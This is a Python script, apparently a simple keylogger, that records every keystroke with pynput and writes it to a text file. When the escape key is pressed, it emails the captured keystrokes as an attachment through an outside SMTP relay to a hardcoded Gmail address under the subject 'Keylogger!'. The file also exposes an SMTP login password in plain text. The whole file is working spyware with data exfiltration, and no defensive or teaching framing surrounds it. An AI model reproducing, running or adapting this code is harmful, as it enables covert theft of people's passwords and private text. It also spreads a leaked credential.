import smtplib
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(
    format='%(asctime)s %(levelname)-8s %(message)s',
    level=logging.INFO,
    datefmt='%Y-%m-%d %H:%M:%S')

keys = []

def on_press(key):
    try:
        logging.info('Key %s pressed.', key.char)

        keys.append(key.char)
    except AttributeError:
        logging.info('Special key %s pressed.', key)
        keys.append(key)

def write_log(keys):
    with open("hackerrupt.txt", "a") as f:
        words = []
        for key in keys:
            if str(key).startswith("Key"):
                if str(key) == "Key.space":
                    words.append(" [key.space] ")
                continue
            words.append(str(key).replace("'", ""))
        if len(words) > 0:
            f.write("".join(words) + "\n")

def on_release(key):
    if key == Key.esc:
        logging.info('Logging stopped.')
        write_log(keys)
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    logging.info('Logging started.')
    l.join()


def send_mail():
    from_addr = 'dmparappagoudar@gmail.com'
    to_addr = 'dmparappagoudar@gmail.com'
    subject = 'Keylogger!'
    content = 'Captured Keystrokes'

    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    body = MIMEText(content, 'plain')
    msg.attach(body)

    filename = 'hackerrupt.txt'
    with open(filename, 'r') as f:
        part = MIMEApplication(f.read(), Name=basename(filename))
        part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(filename))
    msg.attach(part)

    server = smtplib.SMTP('smtp-relay.sendinblue.com', 587)
    server.login(from_addr, '6naBXUStbGv1csrf')
    server.send_message(msg, 'dmparappagoudar@gmail.com', 'dmparappagoudar@gmail.com')

send_mail()
